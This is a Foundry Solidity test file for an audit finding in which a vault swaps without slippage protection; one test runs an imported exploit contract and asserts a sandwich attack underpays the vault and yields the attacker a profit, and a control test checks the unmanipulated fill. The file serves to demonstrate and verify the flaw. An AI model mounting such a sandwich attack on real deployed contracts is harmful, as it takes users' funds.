// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Exploit} from "./12295-h-13-vault-executes-swaps-without-slippage-protection-sherlo.sol";

contract Finding12295Test is Test {
    function test_exploit_sandwich_underpays_the_vault() public {
        Exploit e = new Exploit();
        e.run();

        assertLt(e.vaultGot(), e.fairOut(), "vault fill");
        assertGt(e.profit(), 0, "profit");
        assertEq(e.tokenOut().balanceOf(address(e.vault())), e.vaultGot(), "vault balance");
        emit log_named_uint("vaultGot", e.vaultGot());
        emit log_named_uint("fairOut", e.fairOut());
        emit log_named_uint("profit", e.profit());
    }

    function test_control_quote_before_the_move_is_the_fair_fill() public {
        Exploit e = new Exploit();
        uint256 fair = e.router().quoteExactInput("", 500 ether);
        assertEq(fair, uint256(500 ether) * 1000 / 1500, "fair");
        uint256 got = e.vault().swapTokensMulti(500 ether);
        assertEq(got, fair, "unmanipulated fill");
        assertEq(e.tokenIn().balanceOf(address(e)), 333 ether, "attacker untouched");
    }
}
